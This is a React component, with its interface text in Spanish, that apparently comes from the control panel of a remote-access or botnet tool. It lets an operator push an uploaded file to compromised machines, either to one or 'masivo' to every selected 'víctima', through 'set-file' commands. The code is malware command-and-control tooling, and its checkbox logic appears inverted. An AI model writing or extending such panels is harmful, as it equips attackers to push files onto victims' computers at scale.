import { useContext, useState } from "react";
import { PanelContext } from "../../context/PanelContext";

export default function TabEnviarArchivo() {

    const [nombreArchivo, setnombreArchivo] = useState();
    const { enviarComando, respuestaEviarArchivo, enviarComandoMasivo } = useContext(PanelContext);
    const [check, setcheck] = useState(false);

    const procesa = (event) => {
        if (event.key === 'Enter') {
            event.preventDefault();

            if (check) {
                enviarComando('set-file ' + nombreArchivo)
            } else {
                enviarComandoMasivo('set-file ' + nombreArchivo)
            }
            setnombreArchivo('');
        }
    }
    return <>



        <div className="row">

            <div className="alert alert-info" role="alert">
                envia los archivos que subiste a la <b>carpeta de archivos</b>.
            </div>


            <div className="col-12 col-md-8 mb-3">
                <input
                    type="text"
                    className="form-control"
                    placeholder="Ingresa el nombre del archivo a enviar   (archivo.txt)"
                    value={nombreArchivo}
                    onChange={(e) => setnombreArchivo(e.target.value)}
                    onKeyPress={procesa}
                />
            </div>
            <div className="col-12 col-md-4">
                <div className="form-check">
                    <input className="form-check-input" type="checkbox" value={check} onChange={(e) => setcheck(e.target.checked)}
                        title="Enviar comando a todas las víctimas seleccionadas en la lista. Marca esta casilla para comandos masivos." />
                    <label className="form-check-label" >
                        comando masivo
                    </label>
                </div>
            </div>
        </div>






        <br /><br />

        <div>
            {respuestaEviarArchivo && (
                <div className="alert alert-warning" role="alert">
                    <pre>
                        {respuestaEviarArchivo}
                    </pre>
                </div>
            )}

        </div>
    </>
};
